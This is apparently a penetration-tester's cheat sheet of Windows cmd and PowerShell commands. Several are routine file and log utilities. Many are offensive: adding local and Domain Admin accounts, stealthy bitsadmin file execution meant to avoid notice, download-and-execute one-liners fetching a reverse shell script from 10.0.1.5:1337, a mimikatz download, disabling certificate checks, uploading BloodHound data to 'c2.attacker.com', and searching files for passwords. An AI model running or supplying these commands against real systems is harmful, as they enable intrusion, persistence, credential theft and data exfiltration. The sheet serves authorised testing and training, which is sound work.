# Useful commands in Windows

## Windows - Command Prompt

### Find a file
```batch
dir "\secretfile" /s
```

### Find strings in files
```batch
findstr /s /i "FLAG{" C:\*.*
```

### Find multiple words, strings and patterns
* (Equivalent of `#!bash grep -e WORD1 -e WORD2 -e WORD3`)
```batch
findstr /C:WORD1 /C:WORD2 /C:WORD3 FILENAME.TXT
```

### Enable default local "administrator" account
```batch
net user administrator /active:yes
```

### Adding local accounts (Must have system privileges)
```batch
net user trojand imashortpassword /add
net localgroup administrators trojand /add
```

### Adding a Domain Admin account
```batch
net group "Domain Admins"
net user trojandDA P@ssw0rd /add /domain
net group "Domain Admins" trojandDA /add /domain
net group "Domain Admins"
```

### List files using `#!bash tree`
```batch
tree /f
tree /f /a > tree.txt
```

### Change user password
```batch
net user trojand imareallyreallyreallylongpasswordnow
```

### Windows Built-in Plink for relay
```batch
netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>
```

### Show wireless interfaces
```batch
netsh wlan show networks mode=bssid
```

### Check for logged on users
```batch
query user
qwinsta
```

### List local drives[^1]
```batch
wmic logicaldisk get description,name | findstr /C:"Local"
fsutil fsinfo drives
```

### bitsadmin[^4]
#### Copying a File
* Better than copy. Less conspicuous by having the service do it for you.
```batch
bitsadmin /create JOB & bitsadmin /addfile JOB <LOCAL_SRC> <LOCAL_DST> & bitsadmin /resume JOB & bitsadmin /complete JOB
bitsadmin /create JOB & bitsadmin /addfile JOB %SystemRoot%\System32\cmd.exe C:\Users\Administrator\cmd.exe & bitsadmin /resume JOB & bitsadmin /complete JOB
```
#### Execute a file
* Good for executing files as this will run under `svchost -k netsvcs` as a child process and not under you command prompt
```batch
bitsadmin /create JOB & bitsadmin /addfile JOB <LOCAL_SRC> <LOCAL_DST> & bitsadmin /SetNotifyCmdLine JOB <PROGRAM_NAME> <PARAMETERS> & bitsadmin /resume JOB & bitsadmin /reset
bitsadmin /create JOB & bitsadmin /addfile JOB %TEMP%\test1.txt %TEMP%\test2.txt & bitsadmin /SetNotifyCmdLine JOB C:\Windows\System32\calc.exe NULL & bitsadmin /resume JOB & bitsadmin /reset
```



---
## Windows - Powershell 

### Nested quotes or wrapping multiple double quotes
* Triple double quotes to make one double quote.
* In the example below, the whole RCE command is taken as a variable. Think of the single quotes also as the command portion in your RCE expoits.
    ```powershell
    var g = 'powershell -Exec Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString("""http://10.0.1.5:1337/reverse.ps1""")"'
    ```
* For executing in powershell directly (i.e. interactive powershell), you must use a Grave Accent symbol before the three(3) double quotes.
    ```powershell
    powershell -Exec Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString(`"""http://10.0.1.5:1337/reverse.ps1`""")"
    ```
* BEWARE: This does not seem to work if you are to encode the whole command (IEX...). Better to encode payload/command from Windows to see if it gives an error


### Download & Uploading files
* Ignore bad/untrusted/self-signed certificates
    ```powershell
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    ```
* Download only [^1]
    ```powershell
    Invoke-WebRequest "http://<KALI_IP>:8000/mimikatz.zip" -Out mimikatz.zip
    
    (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
    
    $client = new-object System.Net.WebClient
    $client.DownloadFile("http://<KALI_IP>:8000/mimikatz.zip","mimikatz.zip")
    ```
* Download and execute
    ```powershell
    IEX(New-Object System.Net.WebClient).DownloadString("https://10.0.1.5:1337/reverse.ps1")
    powershell -Exec Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString(`"""http://10.0.1.5:1337/reverse.ps1`""")"
    ```
* Uploading files
    * Setup a [Simple HTTP Server](../Infrastructure_Setup/Simple_Python_Go_Packages.html#projectdiscovery-simplehttpserver) for this command.
    ```
    $uri = "https://c2.attacker.com/bh.zip"
    $uploadPath = "C:\Windows\temp\20210101000109_BloodHound.zip"
    Invoke-RestMethod -Uri $uri -Method Put -InFile $uploadPath -UseDefaultCredentials
    ```

### cat, tail, grep in Windows PS
* Reading Files
    ```powershell
    Get-Content output.log
    ```
* Tail
    ```powershell
    Get-Content output.log -Tail <number of lines>
    Get-Content output.log -Tail 10
    ```
* Tail -f
    ```powershell
    Get-Content output.log -Tail 10 -Wait
    ```
* Grep
    ```powershell
    Get-Content output.log | Select-String -Pattern "<pattern>"
    Get-Content output.log | Select-String -Pattern "password"
    ```
* Grep -A 3
    ```powershell
    Get-Content output.log | Select-String -Pattern "password" -Context 0,3
    ```
* Tail -f | Grep -A 3
    ```powershell
    Get-Content output.log -Tail 10 -Wait | Select-String -Pattern "password" -Context 0,3
    ```

### Find files and contents
* Find files with using filenames
    ```powershell
    Get-ChildItem "C:\" -recurse -filter "*password*"
    ```
* Find contents in files
    ```powershell
    Get-ChildItem "C:\Users" -recurse | Select-String -pattern "passw" | group path | select name
    ```

### Expand Archives
```powershell
Expand-Archive Procdump.zip -DestinationPath "C:\temp\" -Force -Verbose
```

### Base64 Encode Powershell commands
* Some use cases:
    * Encoding[^2] [Powershell one-liners](../Windows/Shells.html#one-liners)
```powershell
$MYCOMAND = "Invoke-WebRequest -Uri 'http://www.contoso.com' -OutFile 'C:\path\file'"
$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MYCOMMAND))
Write-Output $ENCODED
```


[^1]: [Windows Commandline - List local drives from command line](https://www.windows-commandline.com/list-local-drives-command-line/)
[^2]: [Abatchy](https://www.abatchy.com/2017/03/powershell-download-file-one-liners)
[^3]: [Tech Expert](https://techexpert.tips/powershell/powershell-base64-encoding/)
[^4]: [TrustedSec - BITS for Script Kiddies](https://www.trustedsec.com/blog/bits-for-script-kiddies/)
